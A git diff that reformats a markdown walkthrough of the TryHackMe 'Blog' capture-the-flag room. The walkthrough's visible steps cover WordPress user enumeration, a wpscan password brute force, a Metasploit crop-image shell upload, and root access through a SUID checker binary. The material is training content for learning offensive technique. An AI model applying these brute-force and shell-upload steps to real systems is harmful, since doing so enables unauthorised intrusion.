@@ -1,20 +1,20 @@
 # Blog
 
-![tryhackme.com - © TryHackMe](<../../../../../.gitbook/assets/tryhackme-logo-small (3).png>)
+![tryhackme.com - © TryHackMe](.gitbook/assets/tryhackme-logo-small.png)
 
-***
+---
 
 ## Intro
 
-| Room Info            | ![](../../../../../.gitbook/assets/blog.png) |
-| -------------------- | -------------------------------------------- |
-| 🔗 Name              | [Blog](https://tryhackme.com/room/blog)      |
-| 🎯 Target IP         | `10.10.54.35`                                |
-| 📈 Difficulty level  | 🟡Medium                                     |
-| 💲 Subscription type | Free                                         |
-| 🐧 OS                | Linux                                        |
+| Room Info           | ![](.gitbook/assets/blog.png)           |
+| :------------------ | --------------------------------------- |
+| 🔗 Name              | [Blog](https://tryhackme.com/room/blog) |
+| 🎯 Target IP         | `10.10.54.35`                           |
+| 📈 Difficulty level  | 🟡Medium                                 |
+| 💲 Subscription type | Free                                    |
+| 🐧 OS                | Linux                                   |
 
-***
+---
 
 ## Recon
 
@@ -108,14 +108,14 @@ nmap -p 80 --script=http-enum -sV blog.thm
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 ```
 
-* `http://blog.thm/`
-* `http://blog.thm/robots.txt`
-  * Disallow: `/wp-admin/`
+- `http://blog.thm/`
+- `http://blog.thm/robots.txt`
+  - Disallow: `/wp-admin/`
 
 > 🚩 The web server uses the **`WordPress 5.0`** CMS
 
-* `http://blog.thm/wp-admin/`
-  * tried default `admin`:`password` - does not work
+- `http://blog.thm/wp-admin/`
+  - tried default `admin`:`password` - does not work
 
 Perform some SMB enumeration
 
@@ -139,9 +139,9 @@ get check-this.png
 # This looks like a rabbit hole
 ```
 
-![](../../../../../.gitbook/assets/image-20230515105903196.png)
+![](.gitbook/assets/image-20230515105903196.png)
 
-![](../../../../../.gitbook/assets/image-20230515110400089.png)
+![](.gitbook/assets/image-20230515110400089.png)
 
 ```bash
 enum4linux -a blog.thm
@@ -155,9 +155,9 @@ Enumerate all the WordPress users using `WpScan`
 wpscan --url=http://blog.thm --enumerate u
 ```
 
-![](../../../../../.gitbook/assets/image-20230515114507946.png)
+![](.gitbook/assets/image-20230515114507946.png)
 
-![](../../../../../.gitbook/assets/image-20230515115154979.png)
+![](.gitbook/assets/image-20230515115154979.png)
 
 > 📌 Found 2 WordPress users: `bjoel`, `kwheel`
 
@@ -167,14 +167,14 @@ Check for WordPress 5.0 vulnerabilities
 searchsploit wordpress 5.0
 ```
 
-![](../../../../../.gitbook/assets/image-20230515112114376.png)
+![](.gitbook/assets/image-20230515112114376.png)
 
 > There is a vulnerability called [WordPress Core 5.0.0 - Crop-image Shell Upload](https://www.exploit-db.com/exploits/46662)
 >
-> _This module exploits a path traversal and a local file inclusion vulnerability on WordPress versions 5.0.0 and <= 4.9.8._\
-> _The crop-image function allows a user, with at least author privileges,_\
-> _to resize an image and perform a path traversal by changing the \_wp\_attached\_file reference during the upload._\
-> _The second part of the exploit will include this image in the current theme by changing the \_wp\_page\_template attribute when creating a post._
+> *This module exploits a path traversal and a local file inclusion vulnerability on WordPress versions 5.0.0 and <= 4.9.8.
+> The crop-image function allows a user, with at least author privileges,
+> to resize an image and perform a path traversal by changing the _wp_attached_file reference during the upload.
+> The second part of the exploit will include this image in the current theme by changing the _wp_page_template attribute when creating a post.*
 
 Since Karen Wheeler has author access to the blog, brute force the user `kwheel`.
 
@@ -190,11 +190,11 @@ echo -e 'kwheel'> user.txt
 wpscan --url http://blog.thm -P /usr/share/wordlists/rockyou.txt -U user.txt -t 75
 ```
 
-![](../../../../../.gitbook/assets/image-20230515121134836.png)
+![](.gitbook/assets/image-20230515121134836.png)
 
 > 📌 `kwheeler`:`cutiepie1`
 
-***
+---
 
 ## Exploitation
 
@@ -212,7 +212,7 @@ set PASSWORD cutiepie1
 run
 ```
 
-![](../../../../../.gitbook/assets/image-20230515121356765.png)
+![](.gitbook/assets/image-20230515121356765.png)
 
 ```bash
 shell
@@ -233,7 +233,7 @@ Download the `.pdf` file
 download /home/bjoel/Billy_Joel_Termination_May20-2020.pdf
 ```
 
-![](../../../../../.gitbook/assets/image-20230515125200057.png)
+![](.gitbook/assets/image-20230515125200057.png)
 
 ```bash
 shell
@@ -242,7 +242,7 @@ ls /media/usb
 ls: cannot open directory '/media/usb': Permission denied
 ```
 
-***
+---
 
 ## Privilege Escalation
 
@@ -250,7 +250,7 @@ ls: cannot open directory '/media/usb': Permission denied
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-![](../../../../../.gitbook/assets/image-20230515123429464.png)
+![](.gitbook/assets/image-20230515123429464.png)
 
 Try to run `/usr/sbin/checker`
 
@@ -284,7 +284,7 @@ export admin=thm
 # root shell
 ```
 
-![root shell](../../../../../.gitbook/assets/image-20230515125449356.png)
+![root shell](.gitbook/assets/image-20230515125449356.png)
 
 ```bash
 find / -type f -iname user.txt 2>/dev/null
@@ -296,4 +296,5 @@ cat /root/root.txt
 9a0b2***************************
 ```
 
-***
+------
+
